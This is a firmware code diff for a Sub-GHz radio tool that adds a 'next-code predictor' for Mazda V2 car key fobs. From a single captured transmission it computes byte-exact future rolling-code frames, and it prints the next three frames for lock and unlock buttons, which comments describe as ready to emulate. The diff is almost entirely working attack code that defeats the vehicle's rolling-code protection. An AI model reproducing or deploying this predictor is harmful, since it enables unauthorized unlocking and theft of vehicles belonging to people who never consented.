@@ -46,6 +46,7 @@
 #define MAZDA_V2_SYNC_BYTE       0xEC
 #define MAZDA_V2_TOTAL_BURSTS    3
 #define MAZDA_V2_PREAMBLE_PAIRS  80
+#define MAZDA_V2_PREDICT_COUNT   3
 
 static const SubGhzBlockConst subghz_protocol_mazda_v2_const = {
     .te_short = 500,
@@ -1000,6 +1001,81 @@ SubGhzProtocolStatus
 }
 
 // ============================================================================
+// NEXT-CODE PREDICTOR
+// ============================================================================
+
+/**
+ * Compute the full 63-bit frame (packed in a 64-bit container, same layout as
+ * generic.data) that this fob transmits for an ARBITRARY absolute 8-bit counter.
+ *
+ * The Mazda V2 rolling code is cleartext obfuscation, NOT encryption: no secret
+ * key exists. The complete counter->frame mapping is the in-firmware lookup
+ * tables (mazda_v2_rc_lock / mazda_v2_rc_unlock) plus the deterministic,
+ * reversible cycle-XOR derivation (mazda_v2_derive_slot_mask). This helper reuses
+ * exactly those (no crypto reimplementation) and the encoder's packing, so the
+ * predicted cnt+i frames are byte-exact (load/emulate/save-able).
+ *
+ * src_frame:  the captured 64-bit frame (instance->generic.data)
+ * target_cnt: absolute 8-bit counter to encode
+ * returns:    packed 64-bit frame for target_cnt
+ */
+static uint64_t mazda_v2_predict_frame(uint64_t src_frame, uint8_t target_cnt) {
+    uint8_t btn = (uint8_t)((src_frame >> 56) & 0x7F); // strip repeat flag (as encoder)
+    uint8_t sn = (uint8_t)((src_frame >> 48) & 0xFF);
+
+    // Recover source counter and decoded hop columns from the captured frame
+    uint8_t sh3 = (uint8_t)((src_frame >> 16) & 0xFF);
+    uint8_t sh2 = (uint8_t)((src_frame >> 24) & 0xFF);
+    uint8_t src_cnt = ((sh2 & 0x07) << 5) | (sh3 >> 3);
+
+    bool is_lock = (btn == 0x06);
+    const uint8_t (*rc_table)[6] = is_lock ? mazda_v2_rc_lock : mazda_v2_rc_unlock;
+
+    uint8_t src_hop[6];
+    src_hop[0] = (uint8_t)((src_frame >> 40) & 0xFF);
+    src_hop[1] = (uint8_t)((src_frame >> 32) & 0xFF);
+    src_hop[2] = sh2 >> 3;
+    src_hop[3] = sh3 & 0x07;
+    src_hop[4] = (uint8_t)((src_frame >> 8) & 0xFF);
+    src_hop[5] = (uint8_t)((src_frame >> 1) & 0x7F);
+
+    // Detect cycle XOR mask by comparing captured hop vs base table at src counter
+    const uint8_t* src_tbl = rc_table[src_cnt];
+    bool cycle_active = false;
+    uint8_t src_mask[6];
+    for(int i = 0; i < 6; i++) {
+        src_mask[i] = src_hop[i] ^ src_tbl[i];
+        if(src_mask[i] != 0) cycle_active = true;
+    }
+    uint8_t src_slot = (uint8_t)((src_cnt / 2) % 4);
+
+    // Look up target rolling code, then apply the derived cycle mask for its slot
+    uint8_t rc[6];
+    for(int i = 0; i < 6; i++) rc[i] = rc_table[target_cnt][i];
+    if(cycle_active) {
+        uint8_t target_slot = (uint8_t)((target_cnt / 2) % 4);
+        bool dst_unlock_region = (!is_lock && target_cnt < 224);
+        uint8_t target_mask[6];
+        mazda_v2_derive_slot_mask(
+            src_mask, src_slot, target_slot, dst_unlock_region, target_mask);
+        for(int i = 0; i < 6; i++) rc[i] ^= target_mask[i];
+    }
+
+    // Rebuild hop bytes from table + target counter (identical to encoder)
+    uint8_t hop0 = rc[0];
+    uint8_t hop1 = rc[1];
+    uint8_t hop2 = (rc[2] << 3) | ((target_cnt >> 5) & 0x07);
+    uint8_t hop3 = ((target_cnt & 0x1F) << 3) | (rc[3] & 0x07);
+    uint8_t hop4 = rc[4];
+    uint8_t hop5 = rc[5]; // 7 bits
+
+    return ((uint64_t)btn << 56) | ((uint64_t)sn << 48) |
+           ((uint64_t)hop0 << 40) | ((uint64_t)hop1 << 32) |
+           ((uint64_t)hop2 << 24) | ((uint64_t)hop3 << 16) |
+           ((uint64_t)hop4 << 8) | ((uint64_t)(hop5 << 1));
+}
+
+// ============================================================================
 // DISPLAY
 // ============================================================================
 
@@ -1042,6 +1118,20 @@ void subghz_protocol_decoder_mazda_v2_get_string(void* context, FuriString* outp
         mazda_v2_btn_name(instance->generic.btn),
         (unsigned long)instance->generic.cnt,
         (unsigned long long)hop);
+
+    // Next-code predictor: the rolling code is cleartext obfuscation (lookup
+    // tables + reversible cycle-XOR, no secret key), so future frames are
+    // byte-exact. Only run for a valid, fully-populated V2 frame.
+    uint8_t pred_btn = instance->generic.btn & 0x7F;
+    if(instance->generic.data_count_bit == MAZDA_V2_DATA_BITS &&
+       (pred_btn == 0x06 || pred_btn == 0x0A || pred_btn == 0x0E)) {
+        for(uint8_t i = 1; i <= MAZDA_V2_PREDICT_COUNT; i++) {
+            uint8_t next_cnt = (uint8_t)((instance->generic.cnt + i) & 0xFF);
+            uint64_t next_frame = mazda_v2_predict_frame(instance->generic.data, next_cnt);
+            furi_string_cat_printf(
+                output, "\r\nNext+%u:%016llX", i, (unsigned long long)next_frame);
+        }
+    }
 }
 
 // ============================================================================
